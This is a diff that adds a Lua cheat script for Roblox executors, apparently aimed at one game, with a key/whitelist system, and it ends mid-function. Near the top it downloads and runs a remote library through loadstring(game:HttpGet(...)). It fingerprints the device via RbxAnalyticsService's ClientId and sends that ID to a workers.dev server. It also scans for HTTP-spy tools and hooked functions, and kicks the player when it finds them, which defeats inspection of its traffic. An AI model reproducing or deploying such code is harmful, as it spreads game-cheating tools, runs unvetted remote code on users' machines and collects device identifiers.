@@ -1,0 +1,3946 @@
+local Players
+Players = game:GetService("Players")
+local UserInputService
+UserInputService = game:GetService("UserInputService")
+local HttpService
+HttpService = game:GetService("HttpService")
+local RunService
+RunService = game:GetService("RunService")
+local TweenService
+TweenService = game:GetService("TweenService")
+local Debris
+Debris = game:GetService("Debris")
+local ReplicatedStorage
+ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Lighting
+Lighting = game:GetService("Lighting")
+local MaterialService
+MaterialService = game:GetService("MaterialService")
+local localPlayer
+localPlayer = Players.LocalPlayer
+local playerGui
+playerGui = localPlayer:WaitForChild("PlayerGui")
+local lib
+lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/blookzz/skibidi/refs/heads/main/UILib.lua"))()
+local fn, accent, tbl
+local str = "von_autocode.json"
+
+fn = function(accent2)
+	if typeof(accent2) ~= "Color3" then
+		return
+	end
+	local color, v, v2 = Color3.toHSV(accent2)
+	local theme = lib.Theme
+	theme.Accent = accent2
+	theme.AccentDim = Color3.fromHSV(color, v, math.max(v2 * 0.45, 0.05))
+	local min = math.min
+	theme.AccentSec = Color3.fromHSV(color, math.max(v * 0.65, 0), min(v2 * 1.15, 1))
+	theme.ToggleOn = Color3.fromHSV(color, v, math.max(v2 * 0.75, 0.08))
+	theme.Knob = theme.AccentSec
+end
+
+accent = lib.Theme.Accent
+tbl = {}
+
+pcall(function()
+	if typeof(isfile) ~= "function" or typeof(readfile) ~= "function" then
+		return
+	end
+
+	if not isfile(str) then
+		return
+	end
+	local data = HttpService:JSONDecode(readfile(str))
+	if type(data) ~= "table" then
+		return
+	end
+	tbl = data
+
+	if type(data.accent) == "table" then
+		local color = Color3.fromRGB(tonumber(data.accent.R) or 220, tonumber(data.accent.G) or 160, tonumber(data.accent.B) or 60)
+		accent = color
+		fn(color)
+	end
+end)
+
+local fn2
+
+fn2 = function()
+	if typeof(syn.request) == "function" then
+		return syn.request, "syn.request"
+	end
+
+	if typeof(http.request) == "function" then
+		return http.request, "http.request"
+	end
+
+	if typeof(http_request) == "function" then
+		return http_request, "http_request"
+	end
+
+	if typeof(request) == "function" then
+		return request, "request"
+	end
+
+	if typeof(fluxus.request) == "function" then
+		return fluxus.request, "fluxus.request"
+	end
+
+	if typeof(httprequest) == "function" then
+		return httprequest, "httprequest"
+	end
+	return nil, "none"
+end
+
+local tbl2
+tbl2 = { closureCheck = false, clockUsable = false, virtualised = false, note = "not probed yet" }
+local fn3, tbl3
+
+do
+	local function fn4(arg)
+		if typeof(arg) ~= "function" then
+			return nil
+		end
+
+		if typeof(iscclosure) == "function" then
+			local ok, result = pcall(iscclosure, arg)
+			if ok and type(result) == "boolean" then
+				return result and "c" or "lua"
+			end
+		end
+
+		if typeof(islclosure) == "function" then
+			local ok, result = pcall(islclosure, arg)
+			if ok and type(result) == "boolean" then
+				return result and "lua" or "c"
+			end
+		end
+
+		if typeof(debug) == "table" and typeof(debug.getinfo) == "function" then
+			local ok, result = pcall(debug.getinfo, arg)
+			if ok and type(result) == "table" and type(result.what) == "string" then
+				return result.what == "C" and "c" or "lua"
+			end
+		end
+
+		return nil
+	end
+
+	fn3 = function()
+		if typeof(os) == "table" and typeof(os.clock) == "function" then
+			local ok, result = pcall(os.clock)
+			if ok and type(result) == "number" then
+				return result
+			end
+		end
+
+		if typeof(tick) == "function" then
+			local ok, result = pcall(tick)
+			if ok and type(result) == "number" then
+				return result
+			end
+		end
+
+		if typeof(os) == "table" and typeof(os.time) == "function" then
+			local ok, result = pcall(os.time)
+			if ok and type(result) == "number" then
+				return result
+			end
+		end
+
+		return nil
+	end
+
+	pcall(function()
+		local tbl4 = {}
+
+		local function fn5(arg)
+			if typeof(arg) == "function" then
+				tbl4[#tbl4 + 1] = arg
+			end
+		end
+
+		fn5(tostring)
+		fn5(tonumber)
+		fn5(pcall)
+		fn5(rawget)
+		fn5(select)
+		fn5(typeof(string) == "table" and string.format or nil)
+		fn5(typeof(table) == "table" and table.insert or nil)
+		fn5(typeof(math) == "table" and math.floor or nil)
+		local n = 0
+
+		for _, v in ipairs(tbl4) do
+			if fn4(v) == "c" then
+				n += 1
+			end
+		end
+
+		local flag = fn4(function()
+			return nil
+		end) == "lua"
+
+		tbl2.closureCheck = #tbl4 >= 4 and n == #tbl4 and flag
+		tbl2.virtualised = not tbl2.closureCheck
+		local v = fn3()
+
+		if v then
+			local n2 = 0
+
+			for i = 1, 20000 do
+				n2 += 1
+			end
+
+			local v2 = fn3()
+			tbl2.clockUsable = v2 ~= nil and v2 > v
+		end
+
+		tbl2.note = ("closure-check:%s  clock:%s  env:%s"):format(tbl2.closureCheck and "trusted" or "unreliable", tbl2.clockUsable and "ok" or "too coarse", tbl2.virtualised and "virtualised/obfuscated" or "raw")
+	end)
+
+	local genv = nil
+
+	local function fn5()
+		genv = nil
+
+		pcall(function()
+			if typeof(getgenv) == "function" then
+				genv = getgenv()
+			end
+		end)
+
+		if type(genv) ~= "table" then
+			genv = nil
+		end
+	end
+
+	local function fn6(arg)
+		if genv ~= nil then
+			local ok, result = pcall(rawget, genv, arg)
+			if ok and result ~= nil then
+				return result
+			end
+		end
+
+		local ok, result = pcall(function()
+			return getfenv(0)[arg]
+		end)
+
+		if ok then
+			return result
+		end
+		return nil
+	end
+
+	local function fn7(arg)
+		if typeof(arg) ~= "function" then
+			return nil
+		end
+		local tbl4 = {}
+		local getupvalues = fn6("getupvalues")
+
+		if typeof(getupvalues) == "function" then
+			tbl4[#tbl4 + 1] = getupvalues
+		end
+
+		if typeof(debug) == "table" and typeof(debug.getupvalues) == "function" then
+			tbl4[#tbl4 + 1] = debug.getupvalues
+		end
+
+		for _, v in ipairs(tbl4) do
+			local ok, result = pcall(v, arg)
+
+			if ok and type(result) == "table" then
+				local n = 0
+
+				for k in pairs(result) do
+					n += 1
+				end
+
+				return n
+			end
+		end
+
+		return nil
+	end
+
+	local tbl4 = {
+		"getrawmetatable",
+		"setreadonly",
+		"isreadonly",
+		"getgenv",
+		"getrenv",
+		"checkcaller",
+		"iscclosure",
+		"islclosure",
+		"newcclosure",
+		"hookfunction",
+		"getnamecallmethod",
+		"identifyexecutor",
+		"isfile",
+		"gethui",
+		"getconnections",
+		"firesignal",
+		"cloneref",
+		"getcustomasset",
+		"getloadedmodules",
+		"getscriptbytecode",
+	}
+
+	local tbl5 = {
+		"loadstring",
+		"writefile",
+		"appendfile",
+		"readfile",
+		"delfile",
+		"listfiles",
+		"makefolder",
+		"loadfile",
+		"dofile",
+		"setclipboard",
+		"toclipboard",
+		"queue_on_teleport",
+		"queueonteleport",
+	}
+
+	local tbl6 = {
+		{ "syn", "request" },
+		{ "http", "request" },
+		{ "fluxus", "request" },
+		{ "WebSocket", "connect" },
+		{ "websocket", "connect" },
+	}
+
+	local tbl7 = {
+		"httpspy",
+		"httplog",
+		"httpsniff",
+		"spylog",
+		"requestlog",
+		"reqlog",
+		"netspy",
+		"netlog",
+		"packetspy",
+		"trafficlog",
+		"sniffer",
+	}
+
+	local function fn8(arg)
+		local str2 = tostring(arg or ""):lower():gsub("[%s%-_]", "")
+
+		for _, v in ipairs(tbl7) do
+			if str2:find(v, 1, true) then
+				return true
+			end
+		end
+
+		return false
+	end
+
+	local function fn9(arg)
+		local tbl8 = {}
+
+		pcall(function()
+			if typeof(gethui) == "function" then
+				tbl8[#tbl8 + 1] = gethui()
+			end
+		end)
+
+		pcall(function()
+			tbl8[#tbl8 + 1] = game:GetService("CoreGui")
+		end)
+
+		pcall(function()
+			tbl8[#tbl8 + 1] = localPlayer:FindFirstChildOfClass("PlayerGui")
+		end)
+
+		for _, v in ipairs(tbl8) do
+			pcall(function()
+				for _, child in ipairs(v:GetChildren()) do
+					if fn8(child.Name) then
+						arg(2, ("a capture window is open (%s in %s)"):format(child.Name, v.Name))
+						return
+					end
+				end
+			end)
+		end
+	end
+
+	local function fn10()
+		local n = 0
+		local tbl8 = {}
+
+		local function fn11(arg, arg2)
+			n += arg
+			tbl8[#tbl8 + 1] = arg2
+		end
+
+		fn5()
+
+		for _, v in ipairs({ "__HTTP_SPY_LOG", "__HTTP_SPY_ORIG", "__HTTP_SPY_NAMECALL", "__HTTP_SPY_FUNCS", "HttpSpy" }) do
+			if fn6(v) ~= nil then
+				fn11(4, "capture-tool global " .. v .. " is present")
+				break
+			end
+		end
+
+		if genv ~= nil then
+			pcall(function()
+				local n2 = 0
+
+				for k, v in pairs(genv) do
+					n2 += 1
+
+					if not (n2 > 4000) then
+						if fn8(k) then
+							fn11(2, "global '" .. tostring(k) .. "' is named like a traffic logger")
+							break
+						elseif type(v) ~= "table" then
+							continue
+						else
+							local flag = typeof(rawget(v, "uninstall")) == "function"
+							local flag2 = typeof(rawget(v, "copyAll")) == "function" or typeof(rawget(v, "copyLast")) == "function" or typeof(rawget(v, "clear")) == "function"
+
+							if flag and flag2 then
+								fn11(4, "global '" .. tostring(k) .. "' exposes a traffic-logger console API")
+								break
+							else
+								local value = rawget(v, 1)
+
+								if type(value) == "table" and rawget(value, "url") ~= nil and rawget(value, "method") ~= nil and (rawget(value, "reqHeaders") ~= nil or rawget(value, "resBody") ~= nil or rawget(value, "kind") ~= nil) then
+									fn11(4, "global '" .. tostring(k) .. "' holds a captured request log")
+									break
+								else
+									continue
+								end
+							end
+						end
+					end
+
+					break
+				end
+			end)
+		end
+
+		pcall(fn9, fn11)
+		local n2 = 0
+		local n3 = 0
+		local n4 = nil
+
+		for _, v in ipairs(tbl4) do
+			local v2 = fn6(v)
+			local v3 = fn4(v2)
+
+			if v3 then
+				n2 += 1
+
+				if v3 == "c" then
+					n3 += 1
+					local v4 = fn7(v2)
+
+					if v4 ~= nil then
+						n4 = math.max(n4 or 0, v4)
+					end
+				end
+			end
+		end
+
+		if n3 == 0 then
+			return n, tbl8, ("closure differential unavailable (%d of %d readable controls are native)"):format(n3, n2)
+		end
+		local flag = n2 >= 4 and n3 == n2
+		local flag2 = n4 == 0
+		local v = fn2()
+		local flag3 = fn4(v) == "lua"
+		local tbl9 = {}
+		local tbl10 = {}
+
+		local function fn12(arg, arg2)
+			if typeof(arg2) ~= "function" then
+				return
+			end
+			local v2 = flag2 and fn7(arg2) or nil
+			local flag4 = v2 ~= nil and v2 > 0
+
+			if fn4(arg2) == "lua" then
+				tbl9[#tbl9 + 1] = arg
+
+				if flag4 then
+					tbl10[#tbl10 + 1] = arg
+				end
+			elseif flag4 then
+				tbl9[#tbl9 + 1] = arg .. " (newcclosure)"
+				tbl10[#tbl10 + 1] = arg
+			end
+		end
+
+		for _, v2 in ipairs(tbl5) do
+			fn12(v2, fn6(v2))
+		end
+
+		for _, v2 in ipairs(tbl6) do
+			local v3 = fn6(v2[1])
+
+			if type(v3) == "table" then
+				local value = rawget(v3, v2[2])
+
+				if value ~= v then
+					fn12(v2[1] .. "." .. v2[2], value)
+				end
+			end
+		end
+
+		if #tbl9 >= 3 then
+			local str2
+
+			if #tbl10 >= 3 then
+				str2 = "each holding the Lua upvalue a wrapper needs to reach the original"
+			else
+				str2 = nil
+
+				if flag then
+					str2 = "in an environment where every readable executor primitive is native"
+				end
+			end
+
+			if str2 then
+				fn11(4, ("%d executor globals are wrapped in Lua closures (%s), %s – that is a hook set, not an executor"):format(#tbl9, table.concat(tbl9, ", ", 1, 3), str2))
+			else
+				fn11(2, ("%d executor globals are Lua closures (%s), but this environment writes some of its own primitives in Lua, so that is suspicious rather than conclusive"):format(#tbl9, table.concat(tbl9, ", ", 1, 3)))
+			end
+		elseif #tbl9 == 2 then
+			fn11(2, "two executor globals are wrapped in Lua closures: " .. table.concat(tbl9, ", "))
+		elseif #tbl9 == 1 then
+			fn11(1, "executor global " .. tbl9[1] .. " is wrapped in a Lua closure")
+		end
+
+		if flag3 then
+			if flag or #tbl9 > 0 then
+				fn11(2, "the HTTP function is a Lua closure (hooked/replaced)")
+			else
+				fn11(1, "the HTTP function is a Lua closure, but this environment reports closures only partly reliably")
+			end
+		elseif v then
+			local v2 = flag2 and fn7(v) or nil
+
+			if v2 and v2 > 0 then
+				fn11(2, ("the HTTP function reports as native but carries %d Lua upvalue(s) – a real one carries none"):format(v2))
+			end
+		end
+
+		pcall(function()
+			if typeof(getrawmetatable) ~= "function" then
+				return
+			end
+			local v2 = getrawmetatable(game)
+			if type(v2) ~= "table" then
+				return
+			end
+			local value = rawget(v2, "__namecall")
+			local value2 = rawget(v2, "__index")
+			if fn4(value2) == "c" and fn4(value) == "lua" then
+				fn11(1, "game.__namecall has been replaced")
+				return
+			end
+			local v3 = fn7(value)
+
+			if fn7(value2) == 0 and v3 and v3 > 0 then
+				fn11(1, "game.__namecall carries upvalues – it is wrapped")
+			end
+		end)
+
+		return n, tbl8, ("closure differential live (%d of %d readable controls are native, %s)"):format(n3, n2, flag and "strict" or "partial")
+	end
+
+	tbl3 = {
+		locked = false,
+		killed = false,
+		check = function()
+			local ok, result, result2, result3 = pcall(fn10)
+			if not ok then
+				return 0, {}, "environment scan failed: " .. tostring(result)
+			end
+			return result or 0, result2 or {}, result3 or ""
+		end,
+	}
+end
+
+local tbl4
+tbl4 = { Cerebras = "cerebras", Groq = "groq", SambaNova = "sambanova", Gemini = "gemini" }
+local tbl5
+tbl5 = { "Cerebras", "Groq", "SambaNova", "Gemini" }
+local tbl6
+
+tbl6 = {
+	cerebras = "https://api.cerebras.ai/v1/chat/completions",
+	groq = "https://api.groq.com/openai/v1/chat/completions",
+	sambanova = "https://api.sambanova.ai/v1/chat/completions",
+}
+
+local tbl7
+
+tbl7 = {
+	cerebras = "https://cloud.cerebras.ai/",
+	groq = "https://console.groq.com/keys",
+	sambanova = "https://cloud.sambanova.ai/apis",
+	gemini = "https://aistudio.google.com/apikey",
+}
+
+local tbl8
+
+tbl8 = {
+	cerebras = { "gpt-oss-120b", "llama-3.3-70b", "llama3.1-8b" },
+	groq = { "openai/gpt-oss-20b" },
+	sambanova = { "gpt-oss-120b" },
+	gemini = {
+		"gemini-3.5-flash-lite",
+		"gemini-3.7-flash",
+		"gemini-3.1-flash-lite",
+		"gemini-2.5-flash-lite",
+		"gemini-3.6-flash",
+		"gemini-3.5-flash",
+		"gemini-2.5-flash",
+	},
+}
+
+local str2
+str2 = "groq"
+local str3
+str3 = ""
+local str4
+str4 = "openai/gpt-oss-20b"
+local str5
+str5 = ""
+local fn4
+
+fn4 = function()
+	if str5 ~= "" then
+		return str5
+	end
+
+	if str4 ~= "" then
+		return str4
+	end
+	return tbl8[str2] and tbl8[str2][1] or "openai/gpt-oss-20b"
+end
+
+local fn5
+local n = 7709344486
+
+fn5 = function()
+	return game.GameId == n
+end
+
+local str6
+str6 = "https://pastefy.app/HXcx59Y3/raw"
+local v
+v = nil
+local flag
+flag = true
+local flag2
+flag2 = false
+local n2
+n2 = 3
+local n3
+n3 = 1
+local n4
+n4 = 10
+local n5
+n5 = 1
+local tbl9
+tbl9 = { "code is", "riddle is", "use code", "question is", "", "", "", "", "", "" }
+local tbl10
+tbl10 = { { kw = "admin war", rep = "jandel" } }
+local flag3
+flag3 = false
+local tbl11
+tbl11 = {}
+local n6
+n6 = 0
+local n7
+n7 = 0
+local str7
+str7 = nil
+local n8
+n8 = 0
+local n9
+n9 = 0
+local n10
+n10 = 0
+local flag4
+flag4 = false
+local n11
+n11 = 0
+local flag5
+flag5 = false
+local flag6
+flag6 = false
+local str8
+str8 = "firesignal"
+local str9
+str9 = "childadded"
+local tbl12
+
+tbl12 = {
+	entryMethod = tbl.entryMethod == "Remote" and "Remote" or "Firesignal",
+	scanMode = tbl.scanMode == "Controller" and "Controller" or "ChildAdded",
+	antiRagdoll = tbl.antiRagdoll == true,
+	autoBuy = tbl.autoBuy == true,
+	anchorPlayer = tbl.anchorPlayer == true,
+}
+
+local module
+module = nil
+local flag7
+flag7 = false
+local flag8
+flag8 = false
+local flag9
+flag9 = false
+local flag10
+flag10 = false
+local v2
+v2 = nil
+local fn6
+
+fn6 = function(arg, arg2)
+	print("[VON] " .. tostring(arg))
+
+	if v2 then
+		v2.Log(tostring(arg), arg2)
+	end
+end
+
+local fn7
+
+fn7 = function(arg)
+	local n12 = 0
+
+	for match in arg:gmatch(" ") do
+		n12 += 1
+	end
+
+	return n12
+end
+
+local fn8
+
+fn8 = function(arg)
+	if not arg or arg == "" then
+		return false
+	end
+	return #arg >= n4 and fn7(arg) >= n5
+end
+
+local flag11, username, v3, flag12, fn9, fn10, fn11, n12, fn12
+
+do
+	local str10 = "https://whitelist-system.meowstieebo123.workers.dev"
+	local str11 = "vonautocode"
+	flag11 = false
+	username = nil
+	v3 = nil
+	flag12 = false
+	local str12 = nil
+
+	local function fn13()
+		if str12 then
+			return str12
+		end
+		local str13 = "-" .. tostring(localPlayer.UserId)
+		local str14 = nil
+
+		pcall(function()
+			str14 = tostring(game:GetService("RbxAnalyticsService"):GetClientId())
+		end)
+
+		if str14 and str14 ~= "" and str14 ~= "nil" then
+			str12 = str14 .. str13
+			return str12
+		end
+		local txt = nil
+
+		if typeof(isfile) == "function" and typeof(readfile) == "function" then
+			pcall(function()
+				if isfile("von_autocode_hwid.txt") then
+					txt = readfile("von_autocode_hwid.txt")
+				end
+			end)
+		end
+
+		if type(txt) == "string" then
+			txt = txt:gsub("%s+", "")
+			if txt ~= "" then
+				str12 = txt .. str13
+				return str12
+			end
+		end
+
+		if typeof(writefile) == "function" then
+			local str15 = "fb"
+
+			for i = 1, 8 do
+				str15 ..= ("%04x"):format(math.random(0, 65535))
+			end
+
+			if pcall(writefile, "von_autocode_hwid.txt", str15) then
+				str12 = str15 .. str13
+				return str12
+			end
+		end
+
+		str12 = "noclientid" .. str13
+		return str12
+	end
+
+	fn9 = function(arg)
+		if typeof(writefile) == "function" then
+			pcall(writefile, "von_autocode_key.txt", arg)
+		end
+	end
+
+	fn10 = function()
+		if typeof(isfile) == "function" and typeof(readfile) == "function" and isfile("von_autocode_key.txt") then
+			local ok, result = pcall(readfile, "von_autocode_key.txt")
+			if ok and type(result) == "string" and result ~= "" then
+				return result
+			end
+		end
+
+		return nil
+	end
+
+	fn11 = function()
+		if typeof(delfile) == "function" and typeof(isfile) == "function" and isfile("von_autocode_key.txt") then
+			pcall(delfile, "von_autocode_key.txt")
+		end
+	end
+
+	n12 = 2
+	tbl3.KILL_AT = 4
+
+	tbl3.kill = function(arg)
+		if tbl3.killed then
+			return
+		end
+		tbl3.killed = true
+		tbl3.locked = true
+		flag11 = false
+		username = nil
+		v3 = nil
+		local color = Color3.fromRGB
+		pcall(fn6, "Anti-tamper: HTTP capture tool detected — script DISABLED and " .. "player removed (" .. tostring(arg) .. ")", color(220, 80, 80))
+
+		task.spawn(function()
+			for i = 1, 5 do
+				pcall(function()
+					localPlayer:Kick("HTTP capture tool / traffic logger detected.\nClose it completely and rejoin to use this script.")
+				end)
+
+				task.wait(1)
+			end
+		end)
+	end
+
+	local tbl13 = {
+		1116352408,
+		1899447441,
+		3049323471,
+		3921009573,
+		961987163,
+		1508970993,
+		2453635748,
+		2870763221,
+		3624381080,
+		310598401,
+		607225278,
+		1426881987,
+		1925078388,
+		2162078206,
+		2614888103,
+		3248222580,
+		3835390401,
+		4022224774,
+		264347078,
+		604807628,
+		770255983,
+		1249150122,
+		1555081692,
+		1996064986,
+		2554220882,
+		2821834349,
+		2952996808,
+		3210313671,
+		3336571891,
+		3584528711,
+		113926993,
+		338241895,
+		666307205,
+		773529912,
+		1294757372,
+		1396182291,
+		1695183700,
+		1986661051,
+		2177026350,
+		2456956037,
+		2730485921,
+		2820302411,
+		3259730800,
+		3345764771,
+		3516065817,
+		3600352804,
+		4094571909,
+		275423344,
+		430227734,
+		506948616,
+		659060556,
+		883997877,
+		958139571,
+		1322822218,
+		1537002063,
+		1747873779,
+		1955562222,
+		2024104815,
+		2227730452,
+		2361852424,
+		2428436474,
+		2756734187,
+		3204031479,
+		3329325298,
+	}
+
+	local function fn14(arg)
+		return string.char(bit32.band(bit32.rshift(arg, 24), 255), bit32.band(bit32.rshift(arg, 16), 255), bit32.band(bit32.rshift(arg, 8), 255), bit32.band(arg, 255))
+	end
+
+	local function fn15(arg)
+		return (arg:gsub(".", function(arg2)
+			return ("%02x"):format(string.byte(arg2))
+		end))
+	end
+
+	local function fn16(arg)
+		local n13 = #arg * 8
+		local str13 = arg .. "\128"
+
+		while #str13 % 64 ~= 56 do
+			str13 ..= "\0"
+		end
+
+		local str14 = str13 .. fn14(math.floor(n13 / 4294967296)) .. fn14(n13 % 4294967296)
+		local n14 = 1779033703
+		local n15 = 3144134277
+		local n16 = 1013904242
+		local n17 = 2773480762
+		local n18 = 1359893119
+		local n19 = 2600822924
+		local n20 = 528734635
+		local n21 = 1541459225
+
+		for i = 1, #str14, 64 do
+			local tbl14 = {}
+
+			for i2 = 0, 15 do
+				local n22 = i + i2 * 4
+				local lshift = bit32.lshift
+				local byte = string.byte
+				tbl14[i2] = bit32.bor(bit32.lshift(string.byte(str14, n22), 24), bit32.lshift(string.byte(str14, n22 + 1), 16), lshift(string.byte(str14, n22 + 2), 8), byte(str14, n22 + 3))
+			end
+
+			for i2 = 16, 63 do
+				local rshift = bit32.rshift
+				local v4 = tbl14[i2 - 15]
+				local v5 = bit32.bxor(bit32.rrotate(tbl14[i2 - 15], 7), bit32.rrotate(tbl14[i2 - 15], 18), rshift(v4, 3))
+				local rshift2 = bit32.rshift
+				local v6 = tbl14[i2 - 2]
+				tbl14[i2] = bit32.band(tbl14[i2 - 16] + v5 + tbl14[i2 - 7] + bit32.bxor(bit32.rrotate(tbl14[i2 - 2], 17), bit32.rrotate(tbl14[i2 - 2], 19), rshift2(v6, 10)), 4294967295)
+			end
+
+			local v4 = n18
+			local v5 = n19
+			local v6 = n20
+			local v7 = n21
+			local v8 = n14
+			local v9 = n15
+			local v10 = n16
+			local v11 = n17
+
+			for i2 = 0, 63 do
+				local rrotate = bit32.rrotate
+				local bxor = bit32.bxor
+				local band = bit32.band
+				local v12 = bit32.band(v7 + bit32.bxor(bit32.rrotate(v4, 6), bit32.rrotate(v4, 11), rrotate(v4, 25)) + bxor(bit32.band(v4, v5), band(bit32.bnot(v4), v6)) + tbl13[i2 + 1] + tbl14[i2], 4294967295)
+				local rrotate2 = bit32.rrotate
+				local bxor2 = bit32.bxor
+				local band2 = bit32.band
+				local v13 = bit32.band(bit32.bxor(bit32.rrotate(v8, 2), bit32.rrotate(v8, 13), rrotate2(v8, 22)) + bxor2(bit32.band(v8, v9), bit32.band(v8, v10), band2(v9, v10)), 4294967295)
+				local v14 = bit32.band(v11 + v12, 4294967295)
+				v7 = v6
+				v11 = v10
+				v6 = v5
+				v10 = v9
+				v5 = v4
+				v9 = v8
+				v4 = v14
+				v8 = bit32.band(v12 + v13, 4294967295)
+			end
+
+			n14 = bit32.band(n14 + v8, 4294967295)
+			n15 = bit32.band(n15 + v9, 4294967295)
+			n16 = bit32.band(n16 + v10, 4294967295)
+			n17 = bit32.band(n17 + v11, 4294967295)
+			n18 = bit32.band(n18 + v4, 4294967295)
+			n19 = bit32.band(n19 + v5, 4294967295)
+			n20 = bit32.band(n20 + v6, 4294967295)
+			n21 = bit32.band(n21 + v7, 4294967295)
+		end
+
+		return fn14(n14) .. fn14(n15) .. fn14(n16) .. fn14(n17) .. fn14(n18) .. fn14(n19) .. fn14(n20) .. fn14(n21)
+	end
+
+	local function fn17(arg, arg2)
+		if #arg > 64 then
+			arg = fn16(arg)
+		end
+
+		if #arg < 64 then
+			arg ..= string.rep("\0", 64 - #arg)
+		end
+
+		local tbl14 = {}
+		local tbl15 = {}
+
+		for i = 1, 64 do
+			local v4 = string.byte(arg, i)
+			tbl14[i] = string.char(bit32.bxor(v4, 92))
+			tbl15[i] = string.char(bit32.bxor(v4, 54))
+		end
+
+		local v4 = fn16(table.concat(tbl15) .. arg2)
+		return fn15(fn16(table.concat(tbl14) .. v4))
+	end
+
+	local n13 = 0
+
+	tbl3.newNonce = function()
+		n13 += 1
+		local tbl14 = {}
+
+		for i = 1, 4 do
+			tbl14[#tbl14 + 1] = ("%04x"):format(math.random(0, 65535))
+		end
+
+		local n14 = 0
+
+		pcall(function()
+			n14 = math.floor(tick() % 1 * 4294967295)
+		end)
+
+		tbl14[#tbl14 + 1] = ("%08x"):format(n14)
+		tbl14[#tbl14 + 1] = ("%04x"):format(n13 % 65536)
+		return table.concat(tbl14)
+	end
+
+	tbl3.verifyReply = function(arg, arg2)
+		local ok, result = pcall(fn17, "SKIBIDIPOOPGYATT", arg)
+		if not ok or type(result) ~= "string" then
+			return false
+		end
+		local str13 = result:lower()
+		local str14 = tostring(arg2 or ""):lower():gsub("%s+", "")
+		if #str14 ~= #str13 or #str13 == 0 then
+			return false
+		end
+		local n14 = 0
+
+		for i = 1, #str13 do
+			local byte = string.byte
+			n14 = bit32.bor(n14, bit32.bxor(string.byte(str13, i), byte(str14, i)))
+		end
+
+		return n14 == 0
+	end
+
+	tbl3.requireSig = true
+
+	fn12 = function(arg, arg2)
+		local str13 = tostring(arg or ""):gsub("^%s+", ""):gsub("%s+$", "")
+		if str13 == "" then
+			return false, "No key entered", "denied"
+		end
+
+		if tbl3.locked then
+			return false, "Capture tool detected earlier this session – request withheld", "tamper"
+		end
+		local v4 = fn2()
+		if not v4 then
+			return false, "No HTTP function in this executor", "transport"
+		end
+		local n14 = 0
+		local tbl14 = {}
+
+		local function fn18(arg3, arg4)
+			n14 += arg3
+			tbl14[#tbl14 + 1] = arg4
+		end
+
+		local v5, v6, v7 = tbl3.check()
+		n14 += v5
+
+		for _, v8 in ipairs(v6) do
+			tbl14[#tbl14 + 1] = v8
+		end
+
+		if n14 >= n12 then
+			flag11 = false
+			username = nil
+			v3 = nil
+			if tbl3.KILL_AT <= v5 then
+				tbl3.kill("pre-flight scan: " .. table.concat(v6, "; "))
+				return false, "HTTP capture tool detected – script disabled", "tamper"
+			end
+			tbl3.locked = true
+			local color = Color3.fromRGB
+			fn6("Whitelist: request WITHHELD – the environment is being logged: " .. table.concat(tbl14, "; ") .. " [" .. tostring(v7) .. "]", color(220, 80, 80))
+			return false, "HTTP capture tool detected – request withheld", "tamper"
+		end
+
+		local v8 = tbl3.newNonce()
+		local json = HttpService:JSONEncode({ key = str13, hwid = fn13(), script = str11, nonce = v8 })
+		local v9 = fn3()
+
+		local ok, result = pcall(v4, {
+			Url = str10 .. "/check",
+			Method = "POST",
+			Headers = { ["Content-Type"] = "application/json" },
+			Body = json,
+		})
+
+		local v10 = fn3()
+		if not ok or not result then
+			return false, "Failed to contact auth server", "transport"
+		end
+
+		if type(result) == "table" then
+			local str14 = tostring(result.StatusMessage or result.status_message or ""):lower()
+
+			if result.Blocked ~= nil or result.blocked ~= nil or str14:find("block", 1, true) or str14:find("spy", 1, true) or str14:find("intercept", 1, true) then
+				flag11 = false
+				username = nil
+				v3 = nil
+				local color = Color3.fromRGB
+				fn6("Whitelist: the reply was fabricated locally by a capture tool " .. "(status: " .. tostring(result.StatusMessage) .. ")", color(220, 80, 80))
+				tbl3.kill("auth reply fabricated locally (status: " .. tostring(result.StatusMessage) .. ")")
+				return false, "Auth reply was fabricated locally", "tamper"
+			end
+		end
+
+		if tbl2.clockUsable and v9 and v10 then
+			local n15 = v10 - v9
+
+			if n15 >= 0 and n15 < 0.01 then
+				fn18(1, ("answered in %.4fs, faster than a real round trip"):format(n15))
+			end
+		end
+
+		if type(result.Headers) ~= "table" or next(result.Headers) == nil then
+			fn18(1, "response carries no Headers")
+		end
+
+		local num = tonumber(result.StatusCode or result.Status_Code or result.status_code)
+		if num and (num < 200 or num >= 300) then
+			return false, "Auth server error (HTTP " .. tostring(num) .. ")", "transport"
+		end
+		local data = nil
+		if not pcall(function()
+			data = HttpService:JSONDecode(result.Body)
+		end) or type(data) ~= "table" then
+			return false, "Invalid response from auth server", "transport"
+		end
+
+		if n14 >= n12 then
+			flag11 = false
+			username = nil
+			v3 = nil
+			local color = Color3.fromRGB
+			fn6("Whitelist: response failed integrity checks – " .. table.concat(tbl14, "; "), color(220, 80, 80))
+			return false, "Auth response failed integrity check", "tamper"
+		end
+
+		if n14 > 0 and not arg2 then
+			local note = tbl2.note
+			local color = Color3.fromRGB
+			fn6("Whitelist: note – " .. table.concat(tbl14, "; ") .. " (below refusal threshold; " .. note .. "; " .. tostring(v7) .. ")", color(255, 200, 90))
+		end
+
+		if data.success ~= true then
+			flag11 = false
+			username = nil
+			v3 = nil
+			return false, data.message or "Unauthorized", "denied"
+		end
+
+		if tbl3.requireSig then
+			local username2 = data.username or "User"
+			local sig = data.sig or data.signature
+			local str14 = tostring(data.nonce or "")
+			local str15 = v8 .. "|" .. username2 .. "|" .. fn13()
+
+			if type(sig) ~= "string" or sig == "" then
+				flag11 = false
+				username = nil
+				v3 = nil
+				tbl3.kill("auth reply claimed success but carried no signature (fabricated OK)")
+				return false, "Auth reply unsigned – bypass attempt blocked", "tamper"
+			end
+
+			if str14 ~= v8 then
+				flag11 = false
+				username = nil
+				v3 = nil
+				tbl3.kill("auth reply nonce mismatch (replayed or fabricated OK)")
+				return false, "Auth reply nonce mismatch – bypass attempt blocked", "tamper"
+			end
+
+			if not tbl3.verifyReply(str15, sig) then
+				flag11 = false
+				username = nil
+				v3 = nil
+				tbl3.kill("auth reply signature invalid (forged OK)")
+				return false, "Auth reply signature invalid – bypass attempt blocked", "tamper"
+			end
+		end
+
+		flag11 = true
+		username = data.username or "User"
+		v3 = str13
+
+		if not arg2 then
+			fn6("Whitelist: authorised as " .. username, Color3.fromRGB(120, 200, 120))
+		end
+
+		return true, username, "ok"
+	end
+end
+
+local fn13, gui, fn14, fn15, fn16, fn17
+
+do
+	local function fn18(arg)
+		if type(arg) ~= "string" then
+			return ""
+		end
